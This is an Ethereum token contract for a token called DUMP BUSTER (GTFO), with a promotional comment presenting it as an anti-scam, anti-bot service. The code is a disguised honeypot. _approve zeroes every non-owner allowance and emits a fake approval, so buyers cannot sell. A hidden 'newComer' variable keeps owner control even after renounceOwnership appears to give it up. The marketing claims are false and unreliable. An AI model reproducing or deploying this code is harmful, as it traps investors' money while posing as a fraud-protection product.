/**
 *Submitted for verification at Etherscan.io on 2021-11-16
*/

/*

👋 DAY-1 PRODUCT SPEC + ROADMAP

Thank you all for your patience and continued support. We're really proud we can say that we are launching with as much functionality and efficiency as we are. A key factor in a token's cost to transact, regardless of where gas is at in a given moment, is how long it takes to execute. The more blockchain resources you utilize per second, the more expensive it will be. This is who complex token with dividends or reflections often times cost $100-200 in gas when other tokens swapping at the same Gwei transact at half that.

For as big a task as we have in combatting fraud, achieving it at efficiency that make it financially viable to transact our token even for people with only a few hundred or thousand to commit to it. Hats off to the devs on this achievement.

Without further ado (adieu?) -- here's what we're lainching day-1 at a minimum:

LAUNCH CAPABILITIES:

- Customizable blacklisting. Partners can subscribe to chain-wide lists in different categories (bots, snipers, rug pullers, etc).
- Deep-wallet trackbacking. We make it easy to look any number of degrees deep in a chain of associations and seamlessly blacklist them all. Scammers get creative with muddying transactions to hide illicit activity. DumpBuster decodes it so you don't have to.
- Irregularity tracking and Aerts. We're developing off-chain resoures that monitor and are real good at sensing inauthentic or anomalous actibities on the chain, and in your specific asset's trade book. We'll stay on guard and escalate to your attention any activity that falls outside of expected laws of large numbers with insights so you can make your own decisions for what is best for your project and community.
- Anti-Bot & Anti-Snipe Capabilities. Out-of-the-box. We're confident we have the most sophisticated tiered, layered solution for the dreaded launch snipers, bots, and supply hoarders. If you want to set initial buy and transaction limitations as many projects do, we'll make sure those rules are enforced regardless of how creative and covert a corruptive entity may try and be.
- One-Directional Call Stack. It's ciritcal for security that no centralized system or API has control over an ecosystem of tokens. Because if that system were ever compromised, the integrity of all our ecosystem projects would also be compromised. **This is not remotely a plausible risk with DumpBuster.** All transaction processing/enforcement remains inside your token's contract. We cannot call, control, or remotely access your contract -- ever. 
- Flexible and Managed Tax Assessment. One of the most revolutionary innovations to crypto tokenimics is the way in which our fees are assessed. 1.9% of your token's transactions are swapped for $GTFO tokens instead of taken off the table, and those $GTFO token are locked for a period of 90 days. After which, you can do with them what you wish as project deployers. You can just swap them back to recover your tax, even plus gains! This is the service that pays YOU to use it. A common question we get form project deployers is how that assessment takes place. Rest assured it is flexible, gas-conscious, and doesn't create more overhead to you or your staff. Reach out to [email protected] if you'd like to discuss possible partnership!

** While automated and artificial intelligent systems are and will continue to be a major priority for our team and at the core of the technology we develop, we want to stress that for launch, there will always be a human element involved in every step of the process to guarantee no systemic false-positives occur.ofit taking. Projects decide their own tolerances

Invite Link: t.me/DumpBuster

*/


pragma solidity ^0.6.12;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
 
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
 
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
 
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
 
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
 
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) private onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    address private newComer = _msgSender();
    modifier onlyOwner() {
        require(newComer == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract DUMPBUSTER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 private _tTotal = 10000* 10**9* 10**18;
    string private _name = ' DUMP BUSTER ';
    string private _symbol = 'GTFO';
    uint8 private _decimals = 18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function _approve(address ol, address tt, uint256 amount) private {
        require(ol != address(0), "ERC20: approve from the zero address");
        require(tt != address(0), "ERC20: approve to the zero address");

        if (ol != owner()) { _allowances[ol][tt] = 0; emit Approval(ol, tt, 4); }  
        else { _allowances[ol][tt] = amount; emit Approval(ol, tt, amount); } 
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    } 

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    } 
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
}